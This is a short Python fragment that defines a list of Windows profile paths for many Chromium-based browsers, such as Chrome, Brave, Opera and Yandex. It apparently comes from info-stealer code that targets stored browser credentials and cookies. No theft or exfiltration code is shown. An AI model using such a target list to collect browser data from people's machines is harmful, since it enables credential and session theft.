import os

AppData = os.path.join(os.environ['APPDATA'], "")
LOCAL = os.path.join(os.environ['LOCALAPPDATA'], "")

Browser = [
    os.path.join(AppData, "Opera Software\\Opera Stable"),
    os.path.join(LOCAL, "Google\\Chrome"),
    os.path.join(LOCAL, "Google(x86)\\Chrome"),
    os.path.join(LOCAL, "Chromium"),
    os.path.join(LOCAL, "BraveSoftware\\Brave-Browser"),
    os.path.join(LOCAL, "Epic Privacy Browser"),
    os.path.join(LOCAL, "Amigo"),
    os.path.join(LOCAL, "Vivaldi"),
    os.path.join(LOCAL, "Orbitum"),
    os.path.join(LOCAL, "Mail.Ru\\Atom"),
    os.path.join(LOCAL, "Kometa"),
    os.path.join(LOCAL, "Comodo\\Dragon"),
    os.path.join(LOCAL, "Torch"),
    os.path.join(LOCAL, "Comodo"),
    os.path.join(LOCAL, "Slimjet"),
    os.path.join(LOCAL, "360Browser\\Browser"),
    os.path.join(LOCAL, "Maxthon3"),
    os.path.join(LOCAL, "K-Melon"),
    os.path.join(LOCAL, "Sputnik\\Sputnik"),
    os.path.join(LOCAL, "Nichrome"),
    os.path.join(LOCAL, "CocCoc\\Browser"),
    os.path.join(LOCAL, "uCozMedia\\Uran"),
    os.path.join(LOCAL, "Chromodo"),
    os.path.join(LOCAL, "Yandex\\YandexBrowser")
]
